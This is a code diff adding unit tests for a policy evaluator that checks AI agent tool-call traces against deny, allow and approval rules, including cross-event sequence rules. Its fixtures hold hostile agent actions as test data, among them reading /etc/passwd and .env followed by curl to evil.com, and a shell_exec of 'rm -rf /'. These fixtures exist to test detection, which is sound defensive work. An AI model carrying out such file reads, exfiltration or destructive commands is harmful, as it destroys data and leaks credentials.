@@ -394,3 +394,328 @@ describe("evaluate — violation details", () => {
     expect(v?.ciFailure).toBe(true);
   });
 });
+
+// ---------------------------------------------------------------------------
+// on_violation warnings
+// ---------------------------------------------------------------------------
+
+describe("evaluate — on_violation warnings", () => {
+  test("no warnings when on_violation is absent", () => {
+    const trace = [makeEvent(0, "tool_call", { tool_name: "test", arguments: {} })];
+    const policy = makePolicy({ rules: [makeRule()] });
+
+    const result = evaluate(trace, policy);
+    expect(result.warnings).toEqual([]);
+  });
+
+  test("warns when on_violation.notify is defined", () => {
+    const trace = [makeEvent(0, "tool_call", { tool_name: "test", arguments: {} })];
+    const rule = makeRule({
+      on_violation: { notify: ["#security-channel"] },
+    });
+    const policy = makePolicy({ rules: [rule] });
+
+    const result = evaluate(trace, policy);
+    expect(result.warnings).toHaveLength(1);
+    expect(result.warnings[0]).toContain("on_violation.notify");
+    expect(result.warnings[0]).toContain("not yet implemented");
+    expect(result.warnings[0]).toContain("rule-1");
+  });
+
+  test("warns when on_violation.create_issue is true", () => {
+    const trace = [makeEvent(0, "tool_call", { tool_name: "test", arguments: {} })];
+    const rule = makeRule({
+      on_violation: { create_issue: true },
+    });
+    const policy = makePolicy({ rules: [rule] });
+
+    const result = evaluate(trace, policy);
+    expect(result.warnings).toHaveLength(1);
+    expect(result.warnings[0]).toContain("on_violation.create_issue");
+    expect(result.warnings[0]).toContain("not yet implemented");
+  });
+
+  test("warns for both notify and create_issue on same rule", () => {
+    const trace = [makeEvent(0, "tool_call", { tool_name: "test", arguments: {} })];
+    const rule = makeRule({
+      on_violation: { notify: ["#alerts"], create_issue: true },
+    });
+    const policy = makePolicy({ rules: [rule] });
+
+    const result = evaluate(trace, policy);
+    expect(result.warnings).toHaveLength(2);
+  });
+
+  test("no warning when on_violation.notify is empty array", () => {
+    const trace = [makeEvent(0, "tool_call", { tool_name: "test", arguments: {} })];
+    const rule = makeRule({
+      on_violation: { notify: [] },
+    });
+    const policy = makePolicy({ rules: [rule] });
+
+    const result = evaluate(trace, policy);
+    expect(result.warnings).toEqual([]);
+  });
+
+  test("no warning when on_violation.create_issue is false", () => {
+    const trace = [makeEvent(0, "tool_call", { tool_name: "test", arguments: {} })];
+    const rule = makeRule({
+      on_violation: { create_issue: false },
+    });
+    const policy = makePolicy({ rules: [rule] });
+
+    const result = evaluate(trace, policy);
+    expect(result.warnings).toEqual([]);
+  });
+});
+
+// ---------------------------------------------------------------------------
+// Sequence rules (cross-event patterns)
+// ---------------------------------------------------------------------------
+
+describe("evaluate — sequence rules", () => {
+  test("sequence rule produces violation when pattern matches", () => {
+    const trace = [
+      makeEvent(0, "tool_call", { tool_name: "read_file", arguments: { path: "/etc/passwd" } }),
+      makeEvent(1, "tool_result", { tool_name: "read_file", duration_ms: 10 }),
+      makeEvent(2, "tool_call", { tool_name: "curl", arguments: { url: "https://evil.com" } }),
+    ];
+
+    const policy = makePolicy({
+      rules: [
+        makeRule({
+          id: "credential-exfiltration",
+          action: "deny",
+          severity: "critical",
+          message: "Agent read sensitive file then made external request",
+          match: {
+            payload: [],
+            sequence: {
+              steps: [
+                {
+                  event_type: "tool_call",
+                  payload: [{ field: "tool_name", operator: "matches", value: "read" }],
+                },
+                {
+                  event_type: "tool_call",
+                  payload: [{ field: "tool_name", operator: "matches", value: "curl|fetch" }],
+                },
+              ],
+            },
+          },
+        }),
+      ],
+    });
+
+    const result = evaluate(trace, policy);
+    expect(result.verdict).toBe("fail");
+    expect(result.exitCode).toBe(2); // critical
+    expect(result.violations).toHaveLength(1);
+    expect(result.violations[0]?.ruleId).toBe("credential-exfiltration");
+    expect(result.violations[0]?.eventIndex).toBe(0); // first matched event
+  });
+
+  test("sequence rule does not fire when pattern is absent", () => {
+    const trace = [
+      makeEvent(0, "tool_call", { tool_name: "read_file", arguments: {} }),
+      makeEvent(1, "tool_result", { tool_name: "read_file", duration_ms: 10 }),
+    ];
+
+    const policy = makePolicy({
+      rules: [
+        makeRule({
+          id: "exfil-check",
+          action: "deny",
+          severity: "critical",
+          message: "Exfiltration detected",
+          match: {
+            payload: [],
+            sequence: {
+              steps: [
+                {
+                  event_type: "tool_call",
+                  payload: [{ field: "tool_name", operator: "eq", value: "read_file" }],
+                },
+                {
+                  event_type: "tool_call",
+                  payload: [{ field: "tool_name", operator: "eq", value: "curl" }],
+                },
+              ],
+            },
+          },
+        }),
+      ],
+    });
+
+    const result = evaluate(trace, policy);
+    expect(result.verdict).toBe("pass");
+    expect(result.violations).toHaveLength(0);
+  });
+
+  test("sequence rule with allow action does not produce violation", () => {
+    const trace = [
+      makeEvent(0, "tool_call", { tool_name: "read_file", arguments: {} }),
+      makeEvent(1, "tool_call", { tool_name: "curl", arguments: {} }),
+    ];
+
+    const policy = makePolicy({
+      rules: [
+        makeRule({
+          id: "allowed-pattern",
+          action: "allow",
+          severity: "info",
+          message: "Pattern is allowed",
+          match: {
+            payload: [],
+            sequence: {
+              steps: [
+                {
+                  event_type: "tool_call",
+                  payload: [{ field: "tool_name", operator: "eq", value: "read_file" }],
+                },
+                {
+                  event_type: "tool_call",
+                  payload: [{ field: "tool_name", operator: "eq", value: "curl" }],
+                },
+              ],
+            },
+          },
+        }),
+      ],
+    });
+
+    const result = evaluate(trace, policy);
+    expect(result.verdict).toBe("pass");
+    expect(result.violations).toHaveLength(0);
+  });
+
+  test("mixed per-event and sequence rules both fire", () => {
+    const trace = [
+      makeEvent(0, "tool_call", { tool_name: "shell_exec", arguments: { cmd: "rm -rf /" } }),
+      makeEvent(1, "tool_call", { tool_name: "read_file", arguments: { path: ".env" } }),
+      makeEvent(2, "tool_call", { tool_name: "curl", arguments: {} }),
+    ];
+
+    const policy = makePolicy({
+      rules: [
+        // Per-event rule: deny shell_exec
+        makeRule({
+          id: "no-shell",
+          action: "deny",
+          severity: "error",
+          message: "No shell",
+          match: {
+            event_type: "tool_call",
+            payload: [{ field: "tool_name", operator: "eq", value: "shell_exec" }],
+          },
+        }),
+        // Sequence rule: read then curl
+        makeRule({
+          id: "exfil",
+          action: "deny",
+          severity: "critical",
+          message: "Exfiltration",
+          match: {
+            payload: [],
+            sequence: {
+              steps: [
+                {
+                  event_type: "tool_call",
+                  payload: [{ field: "tool_name", operator: "eq", value: "read_file" }],
+                },
+                {
+                  event_type: "tool_call",
+                  payload: [{ field: "tool_name", operator: "eq", value: "curl" }],
+                },
+              ],
+            },
+          },
+        }),
+      ],
+    });
+
+    const result = evaluate(trace, policy);
+    expect(result.verdict).toBe("fail");
+    expect(result.violations).toHaveLength(2);
+    expect(result.violations.map((v) => v.ruleId)).toContain("no-shell");
+    expect(result.violations.map((v) => v.ruleId)).toContain("exfil");
+  });
+
+  test("sequence rule with require-approval action", () => {
+    const trace = [
+      makeEvent(0, "tool_call", { tool_name: "read_file", arguments: {} }),
+      makeEvent(1, "tool_call", { tool_name: "curl", arguments: {} }),
+    ];
+
+    const policy = makePolicy({
+      rules: [
+        makeRule({
+          id: "needs-approval",
+          action: "require-approval",
+          severity: "warning",
+          message: "Approval needed for this pattern",
+          match: {
+            payload: [],
+            sequence: {
+              steps: [
+                {
+                  event_type: "tool_call",
+                  payload: [{ field: "tool_name", operator: "eq", value: "read_file" }],
+                },
+                {
+                  event_type: "tool_call",
+                  payload: [{ field: "tool_name", operator: "eq", value: "curl" }],
+                },
+              ],
+            },
+          },
+        }),
+      ],
+    });
+
+    const result = evaluate(trace, policy);
+    expect(result.verdict).toBe("require-approval");
+    expect(result.exitCode).toBe(3);
+  });
+
+  test("sequence rule violation reports original trace index when scope filters remove events", () => {
+    // Trace: 2 out-of-scope events precede the matching pair.
+    // Scoped indices (0,1) map to original indices (2,3).
+    const trace = [
+      makeEvent(0, "lifecycle", { action: "session_start" }), // out of scope (event_type)
+      makeEvent(1, "tool_call", { tool_name: "read_file", arguments: {} }, "other-agent"), // out of scope (agent)
+      makeEvent(2, "tool_call", { tool_name: "read_file", arguments: {} }), // in scope → scoped[0]
+      makeEvent(3, "tool_result", { tool_name: "read_file", output: "x", duration_ms: 0 }), // in scope → scoped[1]
+    ];
+
+    const policy = makePolicy({
+      scope: { agents: ["test-agent"], event_types: ["tool_call", "tool_result"] },
+      rules: [
+        makeRule({
+          id: "read-then-result",
+          action: "deny",
+          severity: "error",
+          message: "Read followed by result",
+          match: {
+            payload: [],
+            sequence: {
+              steps: [
+                {
+                  event_type: "tool_call",
+                  payload: [{ field: "tool_name", operator: "eq", value: "read_file" }],
+                },
+                { event_type: "tool_result", payload: [] },
+              ],
+            },
+          },
+        }),
+      ],
+    });
+
+    const result = evaluate(trace, policy);
+    expect(result.violations).toHaveLength(1);
+    // violation must reference original trace position, not the filtered position
+    expect(result.violations[0]?.eventIndex).toBe(2);
+    expect(result.violations[0]?.eventId).toBe("evt-002");
+  });
+});
